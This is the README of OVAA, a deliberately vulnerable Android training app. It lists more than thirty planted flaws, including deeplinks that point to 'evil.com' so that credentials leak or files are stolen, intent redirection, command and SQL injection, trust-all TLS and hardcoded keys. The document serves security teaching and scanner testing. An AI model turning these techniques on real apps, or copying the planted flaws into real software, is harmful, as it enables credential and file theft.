## Description
OVAA (Oversecured Vulnerable Android App) is an Android app that aggregates all the platform's known and popular security vulnerabilities.

## List of vulnerabilities
This section only includes the list of vulnerabilities, without a detailed description or proof of concept. Examples from OVAA will receive detailed examination and analysis on [our blog](https://blog.oversecured.com/).

1. Installation of an arbitrary `login_url` via deeplink `oversecured://ovaa/login?url=http://evil.com/`. Leads to the user's user name and password being leaked when they log in.
2. Obtaining access to arbitrary content providers (not exported, but with the attribute `android:grantUriPermissions="true"`) via deeplink `oversecured://ovaa/grant_uri_permissions`. The attacker's app needs to process `oversecured.ovaa.action.GRANT_PERMISSIONS` and pass intent to `setResult(code, intent)` with flags such as `Intent.FLAG_GRANT_READ_URI_PERMISSION` and the URI of the content provider.
3. Vulnerable host validation when processing deeplink `oversecured://ovaa/webview?url=...`.
4. Opening arbitrary URLs via deeplink `oversecured://ovaa/webview?url=http://evilexample.com`. An attacker can use the vulnerable WebView setting `WebSettings.setAllowFileAccessFromFileURLs(true)` in the `WebViewActivity.java` file to steal arbitrary files by sending them XHR requests and obtaining their content.
5. Access to arbitrary activities and acquiring access to arbitrary content providers in `LoginActivity` by supplying an arbitrary Intent object to `redirect_intent`.
6. Theft of arbitrary files in `MainActivity` by intercepting an activity launch from `Intent.ACTION_PICK` and passing the URI to any file as data.
7. Insecure broadcast to `MainActivity` containing credentials. The attacker can register a broadcast receiver with action `oversecured.ovaa.action.UNPROTECTED_CREDENTIALS_DATA` and obtain the user's data.
8. Insecure activity launch in `MainActivity` with action `oversecured.ovaa.action.WEBVIEW`, containing the user's encrypted data in the query parameter `token`.
9. Deletion of arbitrary files via the insecure `DeleteFilesSerializable` deserialization object.
10. Memory corruption via the `MemoryCorruptionParcelable` object.
11. Memory corruption via the `MemoryCorruptionSerializable` object.
12. Obtaining read/write access to arbitrary files in `TheftOverwriteProvider` via path-traversal in the value `uri.getLastPathSegment()`.
13. Obtaining access to app logs via `InsecureLoggerService`. Leak of credentials in `LoginActivity` `Log.d("ovaa", "Processing " + loginData)`.
14. Use of the hardcoded AES key in `WeakCrypto`.
15. Arbitrary Code Execution in `OversecuredApplication` by launching code from third-party apps with no security checks.
16. Use of very wide file sharing declaration for `oversecured.ovaa.fileprovider` content provider in `root` entry.
17. Hardcoded credentials to a dev environment endpoint in `strings.xml` in `test_url` entry.
18. Arbitrary code execution via a DEX library located in a world-readable/writable directory.

### Category coverage components

The classes under `oversecured.ovaa.vulns` exist to cover the remaining vulnerability categories. Each
is an exported component that takes its input from `Intent` extras, so every sink below is reachable
from a third-party app.

19. `CodeExecActivity` (`oversecured.ovaa.action.CODE_EXEC`) — DEX and native library loading from public
directories and from attacker-controlled paths, method calls and field writes through the Reflection
APIs, class loading from a third-party package context, arbitrary system properties, making an
executable world-writable, OS command injection through `Runtime.exec` and `ProcessBuilder`.
20. `FileAccessActivity` (`oversecured.ovaa.action.FILE_ACCESS`) — copying private files to external
storage and to attacker-controlled directories, overwriting, corrupting and deleting an
attacker-supplied path, world-readable/writable file modes, a file path built from input, session data
stored on the SD card.
21. `ExfiltrationActivity` (`oversecured.ovaa.action.EXFILTRATE`) — credentials sent through implicit
activity, broadcast and service intents, files shared through an implicit intent, clipboard, SMS,
network upload, sensitive logging, and an attacker-controlled result intent.
22. `MediaTheftActivity` (`oversecured.ovaa.action.MEDIA`) — user media copied to external storage, to
attacker-controlled directories and to public media providers, then exfiltrated over network, SMS,
implicit intent, clipboard and the activity result.
23. `VulnerableWebViewActivity` (`oversecured.ovaa.action.VULN_WEBVIEW`) — JavaScript, file access,
universal and non-universal file access from file URLs, content access, geolocation, mixed content,
remote debugging, file-scheme and third-party cookies, a JavaScript interface exposing file reads and
the password, XSS and HTML injection through `loadData`/`loadUrl`/`evaluateJavascript`, file theft via
intercepted requests and the file chooser, attacker-controlled cookies.
24. `IntentVulnActivity` (`oversecured.ovaa.action.INTENT_VULN`) — intent redirection from a parcelable
extra and from `Intent.parseUri`, launching an attacker-configured component, starting an
attacker-named fragment, explicit URI grants, and mutable `PendingIntent`s handed out in a broadcast
and in a notification.
25. `WeakCryptoActivity` (`oversecured.ovaa.action.CRYPTO`) — keys from `Random` and from
attacker-controlled data, DES/RC4/ECB, MD5 and SHA-1, a KeyStore key with ECB, no padding and no user
authentication, a seeded `SecureRandom`, and biometric authentication with no `CryptoObject`.
26. `InsecureNetworkActivity` (`oversecured.ovaa.action.NETWORK`) — trust-all `X509TrustManager`, a
hostname verifier that returns `true`, null and anonymous cipher suites over SSLv3/TLSv1, an HTTP
response cache at an attacker-controlled path, and four bypassable host checks (`contains`,
`endsWith`, `startsWith`, a loose regex, and backslash normalisation).
27. `StorageActivity` (`oversecured.ovaa.action.STORAGE`) — SQL injection through `rawQuery`, `execSQL`
and `query` selections, attacker data inserted into the database, password storage in shared
preferences, reading and writing arbitrary preference files, world-readable/writable preferences, and
attacker-controlled XML parsing.
28. `DeviceControlActivity` (`oversecured.ovaa.action.DEVICE`) — writing device settings, setting the
wallpaper from an attacker URI, installing an arbitrary APK, placing calls, killing background
processes and listing running ones, playing attacker-supplied audio, recording the microphone, and a
local web server that serves files by request path.
29. `ConnectivityActivity` (`oversecured.ovaa.action.CONNECTIVITY`) — files and credentials pushed over
an insecure Bluetooth RFCOMM socket and written to an NFC tag, notifications with attacker-controlled
content, and notification hiding.
30. `DeeplinkRedirectActivity` (`ovaa://redirect`) — deeplink redirection into an arbitrary URL and into
the vulnerable WebView, behind a caller check that `startsWith` makes bypassable.
31. `LeakyProvider` (`oversecured.ovaa.leaky_provider`) — an exported provider returning the stored
credentials, opening files by unvalidated path segment, and deleting by an attacker-supplied selection.
32. `CredentialsService` / `ICredentialsService` (`oversecured.ovaa.action.CREDENTIALS`) — an AIDL
interface that hands out the password and reads arbitrary files, and which passes the password to an
attacker-supplied binder.
33. `VulnReceiver` (`oversecured.ovaa.action.VULN_BROADCAST`, and the `android_secret_code` filter) —
deserialization of attacker extras, logging of attacker data, a dynamically registered receiver with no
permission, and intent forwarding into `startService`.
34. `AutoLoadSerializable` — a `readObject` that reads a file and uploads it while it is being
deserialized.
35. Manifest issues — `android:debuggable="true"`, `android:allowBackup="true"`,
`android:usesCleartextTraffic="true"`, custom permissions declared at the `normal` and `dangerous`
protection levels, `android:protectionLevel` used on a component instead of a permission, exported
activities, service, receiver and provider, and permissions requested but never used.

The following categories are deliberately not covered: hardcoded secrets of every kind, and with them
the remote-service categories, which are found by taking a hardcoded token or endpoint out of the
package and confirming the exposure against the live service rather than by reading app code. The
signing-certificate-in-package categories are also left out, since they need a real keystore shipped in
the APK.

The signature categories — a missing V2 signature and a weak signature algorithm — depend on how the
APK is signed rather than on its code. They need a build that targets API 29 or lower, signed with the
V1 (JAR) scheme alone: from API 30 on, Android requires V2 or later, and `apksigner` refuses to verify
a V1-only APK that targets a higher API. The published build targets a current API and is signed V2/V3,
so it does not carry them.

---------------------------------------
*Licensed under the Simplified BSD License*

*Copyright (c) 2020, Oversecured Inc*

https://oversecured.com/